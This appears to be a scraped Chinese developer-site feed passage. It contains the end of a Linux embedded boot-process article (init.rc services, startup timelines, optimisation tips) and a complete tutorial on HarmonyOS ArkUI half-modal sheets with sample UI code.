<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> S10boot (START=10)
<span class="hljs-bullet">   -</span> 挂载文件系统
<span class="hljs-bullet">   -</span> 初始化硬件
<span class="hljs-bullet">   -</span> 加载内核模块

<span class="hljs-bullet">2.</span> S12syslogd (START=12)
<span class="hljs-bullet">   -</span> 启动系统日志服务

<span class="hljs-bullet">3.</span> S13klogd (START=13)
<span class="hljs-bullet">   -</span> 启动内核日志服务

<span class="hljs-bullet">4.</span> S15init.rc (START=15, DEPEND=boot)
<span class="hljs-bullet">   -</span> 启动init.rc服务
<span class="hljs-bullet">   -</span> 解析/etc/init.rc
<span class="hljs-bullet">   -</span> 执行触发器
<span class="hljs-bullet">   -</span> 启动定义的服务

<span class="hljs-bullet">5.</span> S80auto<span class="hljs-emphasis">_startup (START=80, DEPEND=init.rc)
   - 启动自动启动的应用
</span></code></pre>
<hr/>
<h2 data-id="heading-199">9. 启动流程总结</h2>
<h3 data-id="heading-200">9.1 完整启动时间线</h3>
<h4 data-id="heading-201">9.1.1 本系统（使用init.rc）的启动时间线</h4>
<pre><code class="hljs language-csharp" lang="csharp">时间    阶段                    关键操作
─────────────────────────────────────────────
<span class="hljs-number">0</span>ms     硬件上电                 CPU复位
<span class="hljs-number">1</span>ms     BootROM                执行芯片固件
<span class="hljs-number">10</span><span class="hljs-function">ms    <span class="hljs-title">Bootloader</span> (<span class="hljs-params">U-Boot</span>)    初始化硬件，加载内核
100ms   内核解压                解压内核镜像
150ms   汇编初始化              设置MMU、页表
200ms   start_kernel            初始化内核子系统
500ms   kernel_init             准备用户空间
600ms   BusyBox <span class="hljs-keyword">init</span>            读取/etc/inittab
650ms   rcS脚本                 执行/etc/<span class="hljs-keyword">init</span>.d/rcS S boot
700ms   Boot服务 (<span class="hljs-params">S10boot</span>)       挂载文件系统、初始化硬件
800ms   日志服务 (<span class="hljs-params">S12-S13</span>)       启动syslogd、klogd
900ms   Init.rc服务 (<span class="hljs-params">S15</span>)       启动<span class="hljs-keyword">init</span>.rc，解析/etc/<span class="hljs-keyword">init</span>.rc
1000ms  Init.rc触发器           执行<span class="hljs-keyword">on</span> <span class="hljs-keyword">init</span>、<span class="hljs-keyword">on</span> boot触发器
1100ms  Init.rc服务             启动定义的服务
1200ms  自动启动 (<span class="hljs-params">S80</span>)          启动自动启动的应用
1500ms  系统就绪                系统完全启动
</span></code></pre>
<h4 data-id="heading-202">9.1.2 通用Linux系统（使用systemd）的启动时间线</h4>
<pre><code class="hljs language-csharp" lang="csharp">时间    阶段                    关键操作
─────────────────────────────────────────────
<span class="hljs-number">0</span>ms     硬件上电                 CPU复位
<span class="hljs-number">1</span>ms     BootROM                执行芯片固件
<span class="hljs-number">10</span>ms    Bootloader              初始化硬件，加载内核
<span class="hljs-number">100</span>ms   内核解压                解压内核镜像
<span class="hljs-number">150</span>ms   汇编初始化              设置MMU、页表
<span class="hljs-number">200</span>ms   start_kernel            初始化内核子系统
<span class="hljs-number">500</span>ms   kernel_init             准备用户空间
<span class="hljs-number">600</span>ms   用户空间<span class="hljs-keyword">init</span>            启动systemd
<span class="hljs-number">1000</span>ms  系统服务                启动各种服务
<span class="hljs-number">2000</span>ms  登录界面                显示登录界面
<span class="hljs-number">3000</span>ms  用户登录                用户登录
<span class="hljs-number">3500</span>ms  用户会话                启动桌面环境
<span class="hljs-number">4000</span>ms  系统就绪                系统完全启动
</code></pre>
<h3 data-id="heading-203">9.2 关键里程碑</h3>
<h4 data-id="heading-204">9.2.1 内核阶段里程碑</h4>
<ol>
<li><strong>MMU启用</strong>: 内核可以使用虚拟地址</li>
<li><strong>调度器就绪</strong>: 可以运行多个任务</li>
<li><strong>中断启用</strong>: 可以响应硬件事件</li>
<li><strong>根文件系统挂载</strong>: 可以访问文件系统</li>
</ol>
<h4 data-id="heading-205">9.2.2 用户空间阶段里程碑（本系统）</h4>
<ol>
<li><strong>Init进程启动</strong>: 用户空间开始运行</li>
<li><strong>Boot服务完成</strong>: 文件系统挂载完成，硬件初始化完成</li>
<li><strong>Init.rc服务启动</strong>: init.rc解析和执行</li>
<li><strong>Init.rc触发器执行</strong>: on init、on boot等触发器执行</li>
<li><strong>系统服务启动</strong>: 所有定义的服务启动</li>
<li><strong>自动启动应用</strong>: 应用自动启动</li>
<li><strong>系统就绪</strong>: 系统完全启动，可以交互</li>
</ol>
<h4 data-id="heading-206">9.2.3 通用系统里程碑</h4>
<ol>
<li><strong>Init进程启动</strong>: 用户空间开始运行</li>
<li><strong>Systemd启动</strong>: systemd进程启动</li>
<li><strong>系统服务启动</strong>: 系统功能就绪</li>
<li><strong>用户登录</strong>: 用户可以交互</li>
</ol>
<h3 data-id="heading-207">9.3 启动优化</h3>
<h4 data-id="heading-208">9.3.1 内核启动优化</h4>
<ul>
<li><strong>减少initcalls</strong>: 移除不必要的初始化</li>
<li><strong>并行初始化</strong>: 并行执行没有依赖的初始化</li>
<li><strong>延迟初始化</strong>: 延迟非关键初始化</li>
<li><strong>压缩内核</strong>: 使用压缩内核减少加载时间</li>
</ul>
<h4 data-id="heading-209">9.3.2 用户空间启动优化（本系统）</h4>
<ul>
<li><strong>优化Boot脚本</strong>: 减少文件系统检查和挂载时间</li>
<li><strong>减少启动服务</strong>: 只启动必要的服务</li>
<li><strong>优化Init.rc</strong>: 减少不必要的触发器和服务</li>
<li><strong>并行启动</strong>: 利用procd的并行启动能力</li>
<li><strong>延迟启动</strong>: 将非关键服务标记为disabled，需要时再启动</li>
<li><strong>优化依赖关系</strong>: 合理设置DEPEND，避免不必要的等待</li>
</ul>
<h4 data-id="heading-210">9.3.3 通用系统启动优化</h4>
<ul>
<li><strong>并行启动服务</strong>: 并行启动没有依赖的服务</li>
<li><strong>延迟启动</strong>: 延迟非关键服务</li>
<li><strong>减少启动服务</strong>: 只启动必要的服务</li>
<li><strong>优化启动脚本</strong>: 优化启动脚本执行时间</li>
</ul>
<h3 data-id="heading-211">9.4 启动问题排查</h3>
<h4 data-id="heading-212">9.4.1 常见问题</h4>
<ol>
<li><strong>内核panic</strong>: 检查内核日志</li>
<li><strong>根文件系统挂载失败</strong>: 检查根设备配置</li>
<li><strong>Init进程无法启动</strong>: 检查init程序路径</li>
<li><strong>服务启动失败</strong>: 检查服务配置和依赖</li>
</ol>
<h4 data-id="heading-213">9.4.2 调试方法</h4>
<ol>
<li><strong>内核日志</strong>: <code>dmesg</code>查看内核日志</li>
<li><strong>启动日志</strong>: 查看systemd日志</li>
<li><strong>单用户模式</strong>: 进入单用户模式排查</li>
<li><strong>initramfs调试</strong>: 在initramfs中添加调试工具</li>
</ol>
<hr/>
<h2 data-id="heading-214">10. 附录</h2>
<h3 data-id="heading-215">10.1 关键数据结构</h3>
<h4 data-id="heading-216">10.1.1 init_task</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> <span class="hljs-title">init_task</span> =</span> {
    .pid = <span class="hljs-number">0</span>,
    .comm = <span class="hljs-string">"swapper"</span>,
    <span class="hljs-comment">// ... 其他字段</span>
};
</code></pre>
<p>内核的第一个任务，用于早期初始化。</p>
<h4 data-id="heading-217">10.1.2 启动参数</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">char</span> boot_command_line[COMMAND_LINE_SIZE];  <span class="hljs-comment">// 启动命令行</span>
<span class="hljs-type">char</span> *saved_command_line;                   <span class="hljs-comment">// 保存的命令行</span>
</code></pre>
<p>保存内核启动参数。</p>
<h3 data-id="heading-218">10.2 关键函数调用链</h3>
<pre><code class="hljs language-bash" lang="bash">硬件上电
    ↓
BootROM
    ↓
U-Boot
    ↓
<span class="hljs-built_in">arch</span>/arm/boot/compressed/head.S:start
    ↓
解压内核
    ↓
<span class="hljs-built_in">arch</span>/arm/kernel/head.S:stext
    ↓
<span class="hljs-built_in">arch</span>/arm/kernel/head-common.S:__mmap_switched
    ↓
init/main.c:start_kernel
    ↓
init/main.c:rest_init
    ↓
init/main.c:kernel_init
    ↓
用户空间init程序
</code></pre>
<h3 data-id="heading-219">10.3 参考文档</h3>
<ul>
<li>Linux内核源码: <code>linux-5.15-origin/</code></li>
<li>内核文档: <code>Documentation/</code></li>
<li>U-Boot文档: U-Boot官方文档</li>
<li>Systemd文档: systemd官方文档</li>
</ul>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文就可搞清楚的HarmonyOS6.0解锁模态页面的“真香”操作]]></title>    <link>https://juejin.cn/post/7512282349485719593</link>    <guid>https://juejin.cn/post/7512282349485719593</guid>    <pubDate>2025-06-05T10:25:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7512282349485719593" data-draft-id="7512284328866496524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文就可搞清楚的HarmonyOS6.0解锁模态页面的“真香”操作"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-06-05T10:25:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员Feri"/> <meta itemprop="url" content="https://juejin.cn/user/2909785546561066"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文就可搞清楚的HarmonyOS6.0解锁模态页面的“真香”操作
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2909785546561066/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员Feri
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-06-05T10:25:20.000Z" title="Thu Jun 05 2025 10:25:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-06-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0.前言</h2>
<p>最近在搞考试App的HarmonyOS NEXT原生开发，卡在考试功能的答题卡显示上。一开始用弹框做答题卡，效果堪称“买家秀vs卖家秀”——丑到想给产品经理递辞职信（不是）。痛定思痛后，我发现了模态页面这个“神器”，简直打开新世界大门！今天就来和大家聊聊这玩意儿怎么玩～</p>
<h2 data-id="heading-1">1.模态页面：弹窗界的“变形金刚”🤖</h2>
<p>想象一下：你正在打游戏（当前上下文），突然弹出一个任务面板（模态页面），既不挡住游戏画面，又能让你专注处理任务——这就是模态页面的魅力！<br/>
它是个“大面板交互式弹窗”，和普通弹窗最大的区别是<strong>内容全靠自定义</strong>，想塞多少东西塞多少（比如你的考试答题卡）。ArkUI提供了两种形态：</p>
<ul>
<li><strong>半模态</strong>：非全屏弹窗，允许底层页面“露个脸”，适合做轻量级操作（比如选日期、填备注）。</li>
<li><strong>全模态</strong>：霸道总裁式全屏覆盖，必须侧滑才能退出，适合需要沉浸式操作的场景（比如看超长答题卡）。</li>
</ul>
<p><strong>划重点</strong>：半模态支持侧滑、点蒙层、点关闭按钮退出，全模态默认只能侧滑——专治手残党误触！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58cce7d5f0f74880934538f7d41f4123~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=ntlcn3rztJU7AtETeHxzxIgWV1k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">2.半模态页面：温柔的“侧边小助手”👨💻</h2>
<p>半模态就像你的贴心小秘书，不遮挡主界面，却能帮你快速完成任务。比如做个“纪念日管理”功能，选日期、写备注一气呵成～</p>
<h3 data-id="heading-3">生命周期：弹窗的“心跳记录”📅</h3>
<p>半模态的一生很简单：<br/>
<code>诞生前（onWillAppear）→ 登场（onAppear）→ 消失前（onWillDisappear）→ 退场（onDisappear）</code><br/>
就像舞台上的演员，每个阶段都有专属BGM（回调函数），方便你随时“操控”它的状态～</p>
<h3 data-id="heading-4">代码实现：手把手教你搭一个“纪念日小助手”🚀</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
struct Index {
  <span class="hljs-comment">// 定义页面是否显示的状态（是不是很像开关？）</span>
  <span class="hljs-keyword">@State</span> <span class="hljs-attribute">isShow</span>:boolean=false;
  <span class="hljs-comment">// 选中的日期：默认今天，防止用户选“明天考试”这种魔幻操作</span>
  <span class="hljs-keyword">@State</span> <span class="hljs-attribute">selectedDate</span>:Date=new Date();
  <span class="hljs-comment">// 备注信息：留空，等用户吐槽用</span>
  <span class="hljs-keyword">@State</span> <span class="hljs-attribute">remark</span>:string=<span class="hljs-string">""</span>;

  <span class="hljs-comment">// 创建半模态页面的方法：就像搭积木，把组件堆起来</span>
  <span class="hljs-keyword">@Builder</span>
  createSheet() {
    <span class="hljs-built_in">Column</span>({ space: <span class="hljs-number">10</span> }) { <span class="hljs-comment">// 列布局，组件上下排，间距10px</span>
      <span class="hljs-built_in">Row</span>({ space: <span class="hljs-number">10</span> }) { <span class="hljs-comment">// 行布局，组件左右排，间距10px</span>
        Text("纪念日：") <span class="hljs-comment">// 标签，告诉用户这是选日期的地方</span>
        <span class="hljs-comment">// 日历选择器：右边对齐，字体颜色骚气红，点击能选日期</span>
        <span class="hljs-built_in">CalendarPicker</span>({ hintRadius: <span class="hljs-number">10</span>, selected: this.selectedDate })
          <span class="hljs-selector-class">.edgeAlign</span>(CalendarAlign.END)
          <span class="hljs-selector-class">.textStyle</span>({ color: "#ff182431", font: { size: <span class="hljs-number">20</span>, weight: FontWeight.Normal } })
          <span class="hljs-selector-class">.margin</span>(<span class="hljs-number">10</span>)
          <span class="hljs-selector-class">.onChange</span>((value) =&gt; { <span class="hljs-comment">// 选完日期打印日志，方便debug</span>
            console<span class="hljs-selector-class">.info</span>("CalendarPicker onChange:" + JSON.stringify(value))
          })
      }
      <span class="hljs-selector-class">.margin</span>({ top: <span class="hljs-number">30</span> }) <span class="hljs-comment">// 上边距30px，和上面的组件隔开</span>
      <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>") <span class="hljs-comment">// 宽度占父容器90%，防止撑破屏幕</span>

      <span class="hljs-built_in">Row</span>() { <span class="hljs-comment">// 备注输入框区域</span>
        Text("备注：") <span class="hljs-comment">// 标签</span>
        <span class="hljs-built_in">TextInput</span>({ placeholder: "请输入备注信息" }) <span class="hljs-comment">// 输入框，提示用户“快写点什么”</span>
          <span class="hljs-selector-class">.onChange</span>(v =&gt; { // 输入内容实时更新到remark变量
            this.remark = v
          })
      }
      <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>") <span class="hljs-comment">// 同样占90%宽度</span>

      <span class="hljs-comment">// 确认保存按钮：点击后弹Toast，关闭弹窗</span>
      <span class="hljs-selector-tag">Button</span>("确认保存")
        <span class="hljs-selector-class">.width</span>("<span class="hljs-number">80%</span>") <span class="hljs-comment">// 按钮窄一点，显得精致</span>
        <span class="hljs-selector-class">.onClick</span>(() =&gt; {
          this<span class="hljs-selector-class">.getUIContext</span>()<span class="hljs-selector-class">.getPromptAction</span>()<span class="hljs-selector-class">.showToast</span>({
            message: "纪念日：" + this.selectedDate.toDateString() + " 备注：" + this<span class="hljs-selector-class">.remark</span>
          })
          this<span class="hljs-selector-class">.isShow</span> = false; <span class="hljs-comment">// 关闭弹窗，世界清净</span>
        })
    }
    <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>") <span class="hljs-comment">// 整个半模态内容区占90%宽度</span>
    <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">20</span>) <span class="hljs-comment">// 内边距20px，防止内容挤成一团</span>
  }

  <span class="hljs-comment">// 主页面布局：一个按钮，点击打开半模态</span>
  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">Column</span>({space:<span class="hljs-number">20</span>}){
      Text("半模态页面") <span class="hljs-comment">// 标题，简单粗暴</span>
      <span class="hljs-selector-tag">Button</span>("打开半模态页面") <span class="hljs-comment">// 按钮，点击触发“开关”</span>
        <span class="hljs-selector-class">.bindSheet</span>($$this.isShow,this.createSheet,
          {mode:SheetMode.EMBEDDED, detents: [SheetSize.MEDIUM, SheetSize.LARGE, <span class="hljs-number">300</span>]})
        <span class="hljs-selector-class">.onClick</span>(()=&gt;{ <span class="hljs-comment">// 点击时把“开关”打开（isShow设为true）</span>
          this<span class="hljs-selector-class">.isShow</span>=true;
        })
    }
    <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>') <span class="hljs-comment">// 撑满屏幕高度</span>
    <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>') <span class="hljs-comment">// 撑满屏幕宽度</span>
  }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4f05c829f714266aa8a373d94f91a99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=opM3P7ETgnrQroBP3Cna8wqflE0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73c741ee960440eabe074ae28c960aae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=K2ecpCnWzXyy6yHThJnPqN8rd30%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">效果预览：从“丑拒”到“真香”的蜕变📱</h3>
<ul>
<li><strong>打开前</strong>：主页面干干净净，只有一个“打开”按钮，像等待拆封的快递盒。</li>
<li><strong>打开后</strong>：半模态从底部滑出，带着日历和输入框，仿佛弹出一个“秘密小抽屉”。</li>
<li><strong>操作中</strong>：滑动选择日期、输入备注，底层页面“虚化”但不消失，随时提醒你“我还在这儿呢”。</li>
<li><strong>关闭时</strong>：侧滑、点蒙层或点击按钮，弹窗顺滑消失，仿佛一切没发生过（但数据已经保存啦～）。</li>
</ul>
<h2 data-id="heading-6">总结：模态页面为什么香？🤔</h2>
<ul>
<li><strong>灵活度高</strong>：半模态/全模态随意切换，适配不同场景（考试答题卡用全模态，选日期用半模态）。</li>
<li><strong>体验友好</strong>：不遮挡主界面，操作逻辑符合直觉（侧滑关闭超顺手）。</li>
<li><strong>自定义强</strong>：从布局到交互全靠自己写，想多酷炫就多酷炫（比如给答题卡加个滑动翻页效果）。</li>
</ul>
<p>下次准备聊聊全模态页面的实战案例，比如如何用它做一个“沉浸式考试答题卡”～如果你在开发中遇到什么奇葩问题，欢迎留言吐槽，咱们一起搞事情！💪</p>
<blockquote>
<p>如果大家想考取鸿蒙开发者认证的，欢迎加入我的专属考试链接中：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F6ce9d5a998724a849ec634f318107d37%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/6ce9d5a998724a849ec634f318107d37?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cn…</a></p>
</blockquote>
<p><strong>君志所向，一往无前！</strong> 我是Feri，一个专注程序员成长的老司机，下次见～🚗💨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux top、mpstat、htop 原理详解]]></title>    <link>https://juejin.cn/post/7584057497205882923</link>    <guid>https://juejin.cn/post/7584057497205882923</guid>    <pubDate>2025-12-16T06:53:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497205882923" data-draft-id="7584057497205866539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux top、mpstat、htop 原理详解"/> <meta itemprop="keywords" content="嵌入式"/> <meta itemprop="datePublished" content="2025-12-16T06:53:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux top、mpstat、htop 原理详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:53:14.000Z" title="Tue Dec 16 2025 06:53:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读38分钟
